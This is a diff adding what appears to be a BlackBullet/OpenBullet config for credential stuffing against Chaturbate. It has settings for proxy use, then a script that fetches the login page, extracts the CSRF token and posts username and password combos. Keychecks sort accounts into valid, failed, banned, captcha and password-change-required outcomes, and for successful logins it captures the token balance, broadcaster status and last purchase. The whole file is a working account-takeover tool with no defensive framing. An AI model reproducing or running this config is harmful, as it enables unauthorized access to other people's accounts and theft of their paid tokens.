@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "Chaturbate | Blackbullet_fix",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-14T21:02:43.2776522+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "6",
+      "Id": 1057456653
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#get_auth/login/ REQUEST GET "https://chaturbate.com/auth/login/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "pragma: no-cache" 
+  HEADER "cache-control: no-cache" 
+#parse_csrfmiddlewaretoken PARSE "<SOURCE>" CSS "[name=csrfmiddlewaretoken]" "value" 0 -> VAR "csrf" "" "" 
+#post_credentials_+_csrf REQUEST POST "https://chaturbate.com/auth/login/" AutoRedirect=TRUE 
+  CONTENT "next=&csrfmiddlewaretoken=<csrf>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://chaturbate.com/auth/login/" 
+#valid_ KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "LOG OUT" 
+  KEYCHAIN Failure OR 
+    KEY "Please correct the errors below." 
+    KEY "<title>Account Banned - Chaturbate</title>" 
+  KEYCHAIN Ban OR 
+    KEY "Captcha is required " 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Password Change Required" 
+#parse_tokens PARSE "<SOURCE>" LR "<span class='tokencount'>" "</span> " Recursive=FALSE -> CAP "" "" "" 
+#redirect_again REQUEST GET "https://chaturbate.com/tipping/token_stats/?room=<USER>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#parse_verify PARSE "<SOURCE>" LR "accounts/age_verification/\">" "<" Recursive=FALSE -> CAP "Broadcaster" "" "" 
+#parse_most_recent_purchase PARSE "<SOURCE>" LR "<td width='25%'>" "</td>" Recursive=FALSE -> CAP "Last purchase:" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "accounts/age_verification/\">" 
